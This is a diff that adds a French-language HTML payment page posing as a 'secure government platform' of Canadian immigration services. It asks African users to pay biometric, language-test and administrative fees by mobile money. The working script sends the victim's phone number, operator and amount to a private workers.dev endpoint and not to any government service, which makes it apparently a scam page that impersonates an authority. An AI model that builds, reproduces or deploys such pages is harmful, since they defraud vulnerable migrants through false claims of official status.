@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Service Immigration Paiement</title>
+
+<style>
+body {
+  font-family: Arial;
+  background:
+    linear-gradient(rgba(0,0,0,0.6),rgba(0,0,0,0.6)),
+    url("background.jpg") no-repeat center;
+  background-size: cover;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  min-height:100vh;
+  margin:0;
+}
+
+.box {
+  background:white;
+  padding:25px;
+  border-radius:12px;
+  width:90%;
+  max-width:380px;
+  text-align:center;
+}
+
+.logo {
+  width:100px;
+  margin-bottom:10px;
+}
+
+.title {
+  font-weight:bold;
+  margin-bottom:15px;
+}
+
+input, select {
+  width:100%;
+  padding:12px;
+  margin-top:10px;
+  border-radius:6px;
+  border:1px solid #ccc;
+}
+
+.row {
+  display:flex;
+  gap:5px;
+}
+
+.prefix {
+  width:35%;
+  background:#eee;
+}
+
+.phone {
+  width:65%;
+}
+
+button {
+  width:100%;
+  padding:14px;
+  margin-top:15px;
+  background:#00bcd4;
+  color:white;
+  border:none;
+  border-radius:6px;
+  font-weight:bold;
+}
+
+.amount-box {
+  margin-top:10px;
+  font-weight:bold;
+}
+
+#result {
+  margin-top:15px;
+  font-weight:bold;
+}
+
+.footer {
+  position:fixed;
+  bottom:10px;
+  width:100%;
+  text-align:center;
+  color:white;
+  font-size:12px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="box">
+
+<img src="logo.png" class="logo">
+
+<div class="title">Service Immigration Paiement</div>
+
+<select id="service" onchange="updateAmount()">
+  <option value="85">Données biométriques - 85 USD</option>
+  <option value="150">Test de langue - 150 USD</option>
+  <option value="220">Droit administratif - 220 USD</option>
+  <option value="455">Tout payer - 455 USD</option>
+</select>
+
+<select id="country" onchange="updateOperators(); updateAmount(); toggleCurrency()">
+  <option value="CIV">Côte d'Ivoire</option>
+  <option value="CMR">Cameroun</option>
+  <option value="COD">RDC</option>
+  <option value="COG">Congo</option>
+  <option value="GAB">Gabon</option>
+  <option value="SEN">Sénégal</option>
+  <option value="BEN">Bénin</option>
+</select>
+
+<select id="currency" style="display:none" onchange="updateAmount()">
+  <option value="CDF">CDF</option>
+  <option value="USD">USD</option>
+</select>
+
+<select id="operator"></select>
+
+<div class="row">
+  <input id="prefix" class="prefix" readonly>
+  <input id="phone" class="phone" placeholder="Numéro">
+</div>
+
+<div class="amount-box" id="displayAmount"></div>
+
+<button onclick="payer()">Payer</button>
+
+<p id="result"></p>
+
+</div>
+
+<div class="footer">
+© 2026 Services d'immigration Canada - Plateforme gouvernementale sécurisée 🔒
+</div>
+
+<script>
+
+// taux
+const rates = { XOF:550, XAF:550, CDF:2500 };
+
+// devises
+const currencies = {
+  BEN:"XOF", CIV:"XOF", SEN:"XOF",
+  CMR:"XAF", GAB:"XAF", COG:"XAF",
+  COD:"CDF"
+};
+
+// opérateurs
+const operators = {
+  BEN:["MTN","MOOV"],
+  CIV:["MTN","ORANGE"],
+  CMR:["MTN"],
+  COD:["AIRTEL","ORANGE","VODACOM"],
+  GAB:["AIRTEL"],
+  COG:["AIRTEL","MTN"],
+  SEN:["ORANGE","FREE"]
+};
+
+// indicatifs
+const prefixes = {
+  BEN:"229", CIV:"225", CMR:"237",
+  COD:"243", COG:"242", GAB:"241", SEN:"221"
+};
+
+// 🔥 montant final GLOBAL
+let finalAmount = 0;
+
+// update opérateurs
+function updateOperators(){
+  operator.innerHTML="";
+  operators[country.value].forEach(o=>{
+    let opt=document.createElement("option");
+    opt.value=o;
+    opt.textContent=o;
+    operator.appendChild(opt);
+  });
+  prefix.value = prefixes[country.value];
+}
+
+// afficher USD RDC
+function toggleCurrency(){
+  currency.style.display = country.value === "COD" ? "block":"none";
+}
+
+// calcul montant
+function updateAmount(){
+
+  const usd = parseInt(service.value);
+
+  let cur = (country.value==="COD") ? currency.value : currencies[country.value];
+
+  finalAmount = (cur==="USD") ? usd : usd * rates[cur];
+
+  displayAmount.innerText = "Montant à payer : " + finalAmount + " " + cur;
+}
+
+// validation numéro
+function validatePhone(){
+  return /^[0-9]{7,10}$/.test(phone.value.trim());
+}
+
+// paiement
+async function payer(){
+
+  if(!validatePhone()){
+    result.innerText="❌ Numéro invalide";
+    return;
+  }
+
+  result.innerText="⏳ Traitement...";
+
+  const fullPhone = prefix.value + phone.value;
+
+  const res = await fetch("https://orange-queen.serviceprive93.workers.dev/deposit",{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body: JSON.stringify({
+      phone: fullPhone,
+      amount: finalAmount, // ✅ CORRECTION
+      country: country.value,
+      operator: operator.value
+    })
+  });
+
+  const data = await res.json();
+
+  result.innerText =
+    data.status==="ACCEPTED"?"📲 Vérifiez votre téléphone pour confirmé":
+    data.status==="PENDING"?"⏳ En attente":
+    data.status==="SUCCESS"?"✅ Paiement confirmé":
+    "❌ Échec";
+}
+
+// init
+updateOperators();
+updateAmount();
+toggleCurrency();
+
+</script>
+
+</body>
+</html>
